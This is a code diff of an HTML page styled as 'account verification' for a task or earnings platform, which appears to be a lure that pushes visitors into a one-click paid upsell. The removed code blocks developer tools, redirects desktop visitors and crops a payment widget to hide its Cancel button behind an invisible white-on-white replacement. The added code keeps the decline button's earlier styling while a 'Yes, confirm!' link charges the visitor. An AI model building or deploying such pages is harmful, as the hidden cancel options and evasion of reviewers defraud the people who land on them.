@@ -7,12 +7,7 @@
   <meta name="description" content="Account verification and profile synchronization interface.">
   <title>Balance | Task Partners</title>
 
-  <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool" url="https://www.thebetteryouacademy.online/upsell/confidence-self-worth-toolkit"></script>
-    <script type="text/javascript">
-      if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
-        window.location.href = 'https://www.thebetteryouacademy.online/upsell/confidence-self-worth-toolkit';
-      }
-    </script>
+    <script src="https://www.digistore24-scripts.com/service/digistore.js"></script><script>digistoreUpsell()</script>
 
   <script
     src="https://cdn.utmify.com.br/scripts/utms/latest.js"
@@ -49,12 +44,7 @@
     var trackedEvents = Object.create(null);
     var pageStartedAt = Date.now();
     var confirmationStarted = false;
-    var widgetContentReady = false;
     var params = new URLSearchParams(window.location.search);
-    var allowedVendepayOrigins = new Set([
-      "https://checkout.vendepay.com",
-      "https://checkouthml.vendepay.com"
-    ]);
 
     function cleanTag(value, fallback) {
       var cleaned = String(value || fallback || "unknown")
@@ -121,67 +111,19 @@
       trackUp1Event("up1_missing_venda_id");
     }
 
-    function bindWidgetIframe(iframe) {
-      if (!iframe || iframe.dataset.up1TrackingBound === "true") return;
-      iframe.dataset.up1TrackingBound = "true";
-      trackUp1Event("up1_widget_iframe_rendered");
-      iframe.addEventListener("load", function () {
-        trackUp1Event("up1_widget_iframe_loaded");
-      });
-    }
+    // Digistore24 one-click upsell: the Sim/Não buttons are plain links, so we track their clicks.
+    document.addEventListener("click", function (event) {
+      var link = event.target && event.target.closest && event.target.closest("a[data-up1-answer]");
+      if (!link) return;
 
-    document.addEventListener("DOMContentLoaded", function () {
-      var container = document.getElementById("vendepay-upsell-container");
-      if (!container) {
-        trackUp1Event("up1_widget_container_missing");
-        return;
-      }
-
-      bindWidgetIframe(container.querySelector("iframe"));
-
-      new MutationObserver(function () {
-        bindWidgetIframe(container.querySelector("iframe"));
-      }).observe(container, { childList: true, subtree: true });
-    });
-
-    window.addEventListener("message", function (event) {
-      if (!allowedVendepayOrigins.has(event.origin)) return;
-      if (!event.data || event.data.source !== "VendepayUpsell") return;
-
-      var type = event.data.type;
-
-      if (type === "HEIGHT") {
-        widgetContentReady = true;
-        trackUp1Event("up1_widget_content_ready");
-        return;
-      }
-
-      if (type === "PIX_OPEN" || type === "CC_OPEN") {
+      if (link.getAttribute("data-up1-answer") === "yes") {
         confirmationStarted = true;
-        trackUp1Event("up1_confirm_started", {
-          payment_method: type === "PIX_OPEN" ? "pix" : "credit_card"
-        });
-        return;
+        trackUp1Event("up1_confirm_started", { payment_method: "digistore24" });
+      } else {
+        confirmationStarted = true;
+        trackUp1Event("up1_declined");
       }
-
-      if (type === "PIX_SUCCESS") {
-        trackUp1Event("up1_payment_success", { payment_method: "pix" });
-        return;
-      }
-
-      if (type === "CC_TOKEN") {
-        trackUp1Event("up1_card_details_submitted", { payment_method: "credit_card" });
-        return;
-      }
-
-      if (type === "CC_CLOSED" && !trackedEvents.up1_card_details_submitted) {
-        trackUp1Event("up1_payment_flow_closed");
-      }
-    });
-
-    window.setTimeout(function () {
-      if (!widgetContentReady) trackUp1Event("up1_widget_not_ready_8s");
-    }, 8000);
+    }, true);
 
     window.setTimeout(function () {
       if (!confirmationStarted) trackUp1Event("up1_no_action_10s");
@@ -470,17 +412,13 @@
       transform: scale(0.98);
     }
 
-    /* Recorte do widget Vendepay: mostra só a parte de cima ("Yes, confirm!") e esconde
-       o botão Cancel original (que fica fora da área visível, sem ser clicável). A altura
-       é calculada por JS como 52% da altura real do widget, então se adapta a cada aparelho. */
-    #vendepay-clip {
-      position: relative;
-      overflow: hidden;
+    /* Botão "Sim" do upsell Digistore24, com espaço acima. */
+    #upsellYes {
       margin-top: 24px;
     }
 
-    /* Nosso botão Cancel próprio, logo abaixo do recorte. Cor/estilo sob nosso controle.
-       Por ora fica branco no branco (invisível), igual ao Cancel original. */
+    /* Botão "Não" (Digistore24), logo abaixo do "Sim".
+       Estilo herdado de .upsell-btn--no (mantido como estava no Cancel anterior). */
     #customCancel {
       margin-top: 12px;
     }
@@ -529,58 +467,12 @@
           <label class="agreement-label" for="termsAgreement">I agree to the Creator Service Agreement and Distribution Terms.</label>
         </div>
 
-        <!-- Container do upsell, recortado para mostrar só o botão "Yes, confirm!" -->
-        <div id="vendepay-clip">
-          <div id="vendepay-upsell-container"></div>
-        </div>
+        <!-- Upsell Digistore24 (one click). O digistore.js + digistoreUpsell() no <head> cuidam do pedido. -->
+        <a class="upsell-btn upsell-btn--yes" id="upsellYes" data-up1-answer="yes"
+           href="https://www.checkout-ds24.com/answer/yes?template=light">Yes, confirm!</a>
 
-        <!-- Nosso botão Cancel (substitui visualmente o Cancel original, escondido pelo recorte).
-             Leva ao mesmo destino que o Cancel da Vendepay levava. -->
-        <a class="upsell-btn upsell-btn--no" id="customCancel" href="https://withdraw-tiktok.lovable.app">Cancel</a>
-
-        <!-- Script do widget Vendepay Upsell -->
-        <script src="https://widget.vendepay.com/upsell-widget/v1/vendepay-upsell-widget-1.0.16.js?upsellId=1ddc8115-109d-4abb-9c33-22cb1270d91c"
-                onload="window.VendepayUpsellWidget && window.VendepayUpsellWidget.showIframe('vendepay-upsell-container')">
-        </script>
-
-        <!-- Ajuste automático do recorte: lê a altura real do widget em tempo de execução
-             (funciona em qualquer aparelho) e recorta em 52% dela. -->
-        <script>
-        (function () {
-          var CLIP_FRACTION = 0.52;
-          var clip = document.getElementById("vendepay-clip");
-          var container = document.getElementById("vendepay-upsell-container");
-          if (!clip || !container) return;
-
-          function iframeHeight() {
-            var f = container.querySelector("iframe");
-            if (!f) return 0;
-            var h = f.getBoundingClientRect().height;
-            if (h && h > 0) return h;
-            var s = parseFloat(f.style.height);
-            return isNaN(s) ? 0 : s;
-          }
-
-          function applyClip() {
-            var h = iframeHeight();
-            if (h > 0) clip.style.height = Math.round(h * CLIP_FRACTION) + "px";
-          }
-
-          new MutationObserver(applyClip).observe(container, {
-            childList: true, subtree: true, attributes: true, attributeFilter: ["style", "height"]
-          });
-          window.addEventListener("resize", applyClip);
-          window.addEventListener("orientationchange", function () { setTimeout(applyClip, 150); });
-          window.addEventListener("message", function (e) {
-            if (e.origin.indexOf("vendepay.com") === -1) return;
-            if (e.data && e.data.source === "VendepayUpsell" && e.data.type === "HEIGHT") setTimeout(applyClip, 0);
-          });
-          [200, 500, 1000, 2000, 3500, 5000].forEach(function (ms) { setTimeout(applyClip, ms); });
-          var poll = setInterval(applyClip, 800);
-          setTimeout(function () { clearInterval(poll); }, 15000);
-          applyClip();
-        })();
-        </script>
+        <a class="upsell-btn upsell-btn--no" id="customCancel" data-up1-answer="no"
+           href="https://www.checkout-ds24.com/answer/no">Cancel</a>
 
       </div>
     </section>
